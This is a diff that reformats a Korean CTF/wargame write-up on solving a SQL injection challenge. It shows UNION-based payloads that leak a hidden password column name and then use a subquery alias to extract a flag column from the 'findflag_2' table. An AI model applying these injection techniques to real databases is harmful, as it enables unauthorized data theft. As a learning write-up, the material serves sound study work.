@@ -100,7 +100,8 @@ pw 컬럼명을 알아내는 건 굉장히 간단했다. **(이걸 왜 생각 �
 위의 쿼리에서 id, pw 컬럼이 php 변수로 되어 있어 알 수가 없다. 
 
 하지만 만약 쿼리가 ```SELECT * FROM findflag_2 WHERE $id_column='' union select 1,' and $pw_column=',3,4,5 #'```이 된다면 ```and $pw_column=```이 출력이 될 것이다.
-: 이 값은 pw 컬럼명을 담고 있다. 
+
+(이 값은 pw 컬럼명을 담고 있다.)
 
 출력 결과 pw 컬럼명은 ```xPw4coaa1sslfe``` 이다.
 
@@ -126,7 +127,8 @@ flag 컬럼 값을 어떻게 출력하는가 하면 서브쿼리와 alias를 통
 <br>
 
 예를 들어, rubiya 테이블에 있는 결과 값을 컬럼명을 다르게 해서 가져오고 싶다라고 할 때 아래와 같은 쿼리로 가져올 수 있다.
-: ```select 1,2,3 union SELECT * FROM rubiya```
+
+```select 1,2,3 union SELECT * FROM rubiya```
 
 <br>
 
@@ -135,7 +137,8 @@ flag 컬럼 값을 어떻게 출력하는가 하면 서브쿼리와 alias를 통
 <br>
 
 따라서 이 쿼리 결과를 테이블로 사용한다면? 결과는 아래와 같다.
-: ```select * from rubiya where id='' union select * from (select 1,2,3 union select * from rubiya) x```
+
+```select * from rubiya where id='' union select * from (select 1,2,3 union select * from rubiya) x```
 
 <br>
 
@@ -162,7 +165,8 @@ flag 컬럼 값을 어떻게 출력하는가 하면 서브쿼리와 alias를 통
 <br>
 
 이를 이용해서 findflag_2의 값을 가져올 건데 flag가 있을만한 위치를 alias를 해준 다음 그 결과 값을 테이블로 사용해서 2번째 위치에 alias를 넣어서 출력해준다.
-: ```SELECT * FROM findflag_2 where id='' union select 1,flag,3,4,5 from (select 1,2,3,4 flag,5 union select * from findflag_2) x limit 1,1 #```
+
+```SELECT * FROM findflag_2 where id='' union select 1,flag,3,4,5 from (select 1,2,3,4 flag,5 union select * from findflag_2) x limit 1,1 #```
 
 <br>
 
